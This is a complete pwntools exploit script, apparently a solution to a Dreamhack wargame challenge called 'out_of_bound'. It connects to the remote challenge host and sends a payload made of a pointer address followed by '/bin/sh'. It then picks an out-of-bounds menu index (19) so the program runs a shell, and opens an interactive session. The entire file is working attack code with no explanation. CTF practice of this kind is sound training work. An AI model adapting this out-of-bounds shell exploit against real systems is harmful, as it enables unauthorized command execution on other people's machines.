from pwn import *

e = ELF('./out_of_bound')
libc = e.libc

# Local
#r = process('./out_of_bound')

# Remote
r = remote('host3.dreamhack.games', 12375)

PAYLOAD = p32(0x804a0ac+4) + b'/bin/sh\x00'

# 1. Set Admin name to /bin/sh\00
r.recvuntil(b'Admin name: ')
r.send(PAYLOAD)

# 2. OOB Attack And Get Shell
r.recvuntil(b'What do you want?: ')
r.sendline(b'19')

r.interactive()